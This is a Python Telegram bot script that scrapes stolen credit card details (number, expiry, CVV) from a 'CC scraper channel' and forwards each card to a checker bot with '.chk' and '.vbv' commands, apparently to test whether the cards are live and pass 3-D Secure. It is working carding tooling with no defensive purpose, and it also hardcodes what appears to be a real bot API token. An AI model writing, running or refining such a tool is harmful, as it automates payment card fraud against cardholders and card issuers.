import telebot
import re
import time
import threading

# Set up the bot with the provided token
API_TOKEN = '7785068082:AAEwD4mFUHLVLSeA5JrXZYnj8UKt52cFpHw'
bot = telebot.TeleBot(API_TOKEN)

# Regular expression pattern to match the CC format: card_number|MM|YY|CVV
cc_pattern = re.compile(r'\b(\d{16})\|(\d{2})\|(\d{2})\|(\d{3,4})\b')

# Channel usernames
source_channel = input("Enter the link to the CC scraper channel: ")  # User input for source channel
target_channel = '@SDBB_Bot'  # The bot to send messages to

# Function to send messages to the @SDBB_Bot
def send_to_sdbb_bot(cc_info):
    chk_message = f".chk {cc_info}"
    vbv_message = f".vbv {cc_info}"
    
    bot.send_message(target_channel, chk_message)
    time.sleep(1)  # Sleep for a second between messages
    bot.send_message(target_channel, vbv_message)

# Function to scrape CC details from the source channel
def scrape_cc_details():
    last_message_id = None  # To keep track of the last processed message

    while True:
        try:
            # Get messages from the source channel
            updates = bot.get_updates()
            for update in updates:
                if update.message and update.message.chat.username == source_channel:
                    message = update.message
                    if message.message_id == last_message_id:
                        continue  # Skip already processed messages
                    
                    # Check if the message matches the desired formats
                    if "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝" in message.text or "𝗣𝗮𝘀𝘀𝗲𝗱" in message.text:
                        cc_matches = cc_pattern.findall(message.text)
                        
                        for match in cc_matches:
                            cc_number = match[0]
                            expiration_month = match[1]
                            expiration_year = match[2]
                            cvv = match[3]
                            cc_info = f"{cc_number}|{expiration_month}|{expiration_year}|{cvv}"
                            
                            # Send to @SDBB_Bot with the required format
                            send_to_sdbb_bot(cc_info)

                    last_message_id = message.message_id  # Update the last processed message ID

            time.sleep(70)  # Wait for 1 minute and 10 seconds before checking for new messages
            
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(10)  # Wait before retrying in case of an error

# Start a thread to scrape CC details
threading.Thread(target=scrape_cc_details).start()

# Start the bot polling
bot.polling()